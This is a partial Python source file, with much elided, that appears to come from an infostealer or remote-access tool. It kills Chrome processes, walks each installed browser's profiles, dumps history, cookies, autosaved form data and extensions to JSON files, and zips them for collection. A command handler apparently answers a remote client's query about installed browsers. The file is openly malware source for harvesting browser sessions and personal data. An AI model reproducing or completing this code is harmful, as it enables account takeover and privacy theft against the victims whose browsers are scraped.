...
def extract_cookies():
    ...
    def kill_chrome_process_by_pid(chrome_proc):
        try:
...
def get_browser_data():
    ...
    zip_file_path = os.path.join(temp_dir, "browser_data.zip")
    ...
    installed_browsers, _ = detect_installed_browsers()

    for browser, base_path in paths.items():
        if browser in installed_browsers and os.path.exists(base_path):
            ...
            for profile in os.listdir(base_path):
                ...
                if os.path.isdir(profile_path) and (profile.lower().startswith("profile") or profile.lower() == "default"):
                    ...
                    with open(os.path.join(profile_dir, "history.json"), "w", encoding="utf-8") as f:
                        json.dump(data["history"], f, indent=4)

                    with open(os.path.join(profile_dir, "cookies.json"), "w", encoding="utf-8") as f:
                        json.dump(data["cookies"], f, indent=4)

                    with open(os.path.join(profile_dir, "autosave.json"), "w", encoding="utf-8") as f:
                        json.dump(data["autosaved"], f, indent=4)

                    with open(os.path.join(profile_dir, "extensions.json"), "w", encoding="utf-8") as f:
                        json.dump(data["extensions"], f, indent=4)
...
def browsers(client, data, converter):
    ...
    try:
        if command == "installed_browsers":
            ...
            data = "Installed: " + ", ".join(installed_browsers) if installed_browsers else "Not Installed: " + ", ".join(not_found_browsers)
